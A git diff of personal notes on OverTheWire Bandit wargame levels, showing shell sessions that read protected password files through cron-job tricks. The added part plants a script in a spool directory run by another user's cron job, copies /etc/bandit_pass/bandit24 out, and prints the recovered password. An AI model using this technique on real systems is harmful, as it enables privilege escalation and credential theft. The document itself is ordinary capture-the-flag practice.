@@ -1,30 +1,55 @@
 Level 23->24
 
-bandit22@bandit:/usr/bin$ cat cronjob_bandit23.sh 
+#SHELL
+
+bandit23@bandit:/usr/bin$ cat cronjob_bandit24.sh 
 #!/bin/bash
 
 myname=$(whoami)
-mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
 
-echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+	echo "Handling $i"
+	timeout -s 9 60 ./$i
+	rm -f ./$i
+    fi
+done
 
-cat /etc/bandit_pass/$myname > /tmp/$mytarget
-bandit22@bandit:/usr/bin$ ./cronjob_bandit23.sh 
-Copying passwordfile /etc/bandit_pass/bandit22 to /tmp/8169b67bd894ddbb4412f91573b38db3
-bandit22@bandit:/usr/bin$ echo I am user $myname
-I am user
-bandit22@bandit:/usr/bin$ echo I am user $(whoami)
-I am user bandit22
-bandit22@bandit:/usr/bin$ echo I am user $(whoami) | cut -d ' ' -f 1
-I
-bandit22@bandit:/usr/bin$ echo I am user $(whoami) | md5sum | cut -d ' ' -f 1
-8169b67bd894ddbb4412f91573b38db3
-bandit22@bandit:/usr/bin$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
-8ca319486bfbbc3663ea0fbe81326349
-bandit22@bandit:/usr/bin$ cd /tmp/8ca319486bfbbc3663ea0fbe81326349
--bash: cd: /tmp/8ca319486bfbbc3663ea0fbe81326349: Not a directory
-bandit22@bandit:/usr/bin$ cd /tmp/
-bandit22@bandit:/tmp$ ls
-ls: cannot open directory '.': Permission denied
-bandit22@bandit:/tmp$ cat 8ca319486bfbbc3663ea0fbe81326349
-jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+bandit23@bandit:/usr/bin$ cd /tmp
+bandit23@bandit:/tmp$ mkdir fuckit123
+bandit23@bandit:/tmp$ cd fuckit123
+bandit23@bandit:/tmp/fuckit123$ nano
+Unable to create directory /home/bandit23/.nano: Permission denied
+It is required for saving/loading search history or cursor positions.
+
+Press Enter to continue
+
+#NANO EDITOR
+#!/bin/bash
+
+cat /etc/bandit_pass/bandit24 > /tmp/fuck1it23/pswd
+
+#SHELL
+bandit23@bandit:/tmp/fuckit123$ chmod 777 hack.sh 
+bandit23@bandit:/tmp/fuckit123$ cp hack.sh /var/spool/bandit24
+bandit23@bandit:/tmp/fuckit123$ ls
+hack.sh
+bandit23@bandit:/tmp/fuckit123$ touch pswd
+bandit23@bandit:/tmp/fuckit123$ ls
+hack.sh  pswd
+bandit23@bandit:/tmp/fuckit123$ chmod 777 pswd 
+bandit23@bandit:/tmp/fuckit123$ ls
+hack.sh  pswd
+bandit23@bandit:/tmp/fuckit123$ file pswd
+pswd: empty
+bandit23@bandit:/tmp/fuckit123$ cp hack.sh /var/spool/bandit24
+bandit23@bandit:/tmp/fuckit123$ cat pswd
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+
+
+
